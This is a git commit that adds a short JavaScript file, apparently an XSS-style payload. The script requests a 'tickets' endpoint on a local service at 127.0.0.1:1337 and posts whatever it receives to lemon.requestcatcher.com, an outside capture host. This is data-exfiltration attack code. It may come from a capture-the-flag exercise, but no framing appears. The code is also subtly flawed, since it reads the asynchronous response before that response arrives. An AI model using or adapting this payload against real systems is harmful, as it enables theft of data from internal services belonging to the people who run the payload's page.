c4ed70f3efab0fcde59741fc8cf5c7e3e51246a5
UnlikeLemon <83449816+UnlikeLemon@users.noreply.github.com>
2021-10-22 15:56:39 -0700

    Create js_script.js

---
+++ js_script.js
@@ -0,0 +1,14 @@
+const xhrr = new XMLHttpRequest();
+xhrr.open("GET", "http://127.0.0.1:1337/tickets",true);
+
+xhrr.send();
+const v = xhrr.response;
+
+
+
+const xhr = new XMLHttpRequest();
+xhr.open("POST", "https://lemon.requestcatcher.com/", true);
+let data = v;
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+xhr.send(data);
